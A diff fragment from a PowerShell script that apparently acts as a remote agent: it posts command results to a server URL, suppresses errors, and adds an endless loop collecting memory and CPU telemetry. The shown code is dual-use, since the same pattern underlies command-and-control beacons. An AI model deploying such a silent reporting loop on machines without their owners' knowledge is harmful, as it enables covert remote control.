@@ -151,6 +151,8 @@ function Send-Result { param($commandId, $status, $output, $errText)
     try { Invoke-RestMethod -Uri "$($serverUrl)/result" -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json" } catch { } 
 }
 
+while ($true) {
+    try {
         # Telemetry: Network & Resources
         $mem = Get-CimInstance Win32_OperatingSystem
         $cpu = (Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average
